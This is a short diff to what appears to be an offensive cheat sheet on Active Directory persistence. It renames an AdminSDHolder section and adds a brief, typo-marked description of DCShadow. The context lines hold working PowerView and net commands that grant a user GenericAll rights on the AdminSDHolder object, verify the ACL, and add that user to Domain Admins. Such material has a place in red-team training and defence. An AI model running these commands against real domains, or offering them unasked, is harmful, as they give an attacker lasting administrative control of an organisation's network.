@@ -1,4 +1,4 @@
-### AdminSDHolder
+### AdminSDHolder Persistent
 ```
 The User John has granted GenericAll Privilege.
 
@@ -9,4 +9,9 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'John'}
 
 net group "domain admins" John /add /domain
+```
+
+###  DCShadow Persistent
+```
+DCShadow is a persistence technique which is  allowing an attacker to push malicious changes into the environment by modifying active directory objects.domain privileges is requiredto carry out this attack
 ```
